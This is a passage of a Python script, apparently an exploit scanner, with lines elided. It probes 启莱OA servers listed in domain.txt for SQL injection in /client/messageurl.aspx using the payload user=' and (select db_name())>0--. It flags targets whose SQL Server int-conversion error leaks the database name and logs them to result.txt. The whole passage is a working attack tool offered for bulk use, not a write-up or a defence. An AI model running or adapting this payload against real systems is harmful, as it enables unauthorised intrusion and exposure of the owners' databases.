...
def postData(url, headers, proxies):
    try:
        s = ""
        poc = f"/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1"
        urldata = url.strip("\n") + poc
        ...
        if re.status_code == 500:
            if re.text.find("转换成数据类型 int 时失败") >= 0:
                print("[+]存在漏洞", urldata)
                s += urldata + "\n"
                with open("D:\\code\\python\\exp\\启莱OAmessageurl\\result.txt", "a", encoding="utf-8") as f:
                    f.write(s)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\启莱OAmessageurl\\domain.txt", encoding="utf-8") as f:
